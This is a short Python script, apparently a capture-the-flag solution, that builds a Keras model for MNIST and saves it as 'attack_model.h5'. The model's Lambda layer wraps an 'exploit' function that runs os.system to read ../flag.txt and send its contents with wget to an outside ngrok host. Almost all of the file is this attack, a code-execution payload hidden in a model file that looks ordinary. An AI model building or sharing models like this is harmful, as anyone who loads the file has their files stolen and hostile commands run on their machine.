from tensorflow import keras
import json
import random
from tensorflow import keras
from keras.datasets import mnist
from keras.utils.np_utils import to_categorical
from keras.models import Sequential
from keras.layers.core import Dense, Dropout, Activation, Lambda

def exploit(x):
	import os
	ngrok_ip = "<redacted>"
	os.system("flag=$(cat ./../flag.txt);url='http://" + ngrok_ip + "/?flag=';wget $(echo $url$flag)")
	return x


(X_train, y_train), (X_test, y_test) = mnist.load_data()

X_test = X_test.reshape(10000, 784)
X_test = X_test.astype("float32")
X_test /= 255
n_classes = 10
Y_test = to_categorical(y_test, n_classes)

model = Sequential()

model.add(Dense(10, input_shape=(784,)))
model.add(Lambda(exploit))

model.compile(loss="categorical_crossentropy", metrics=["accuracy"], optimizer="adam")

model.save("attack_model.h5")
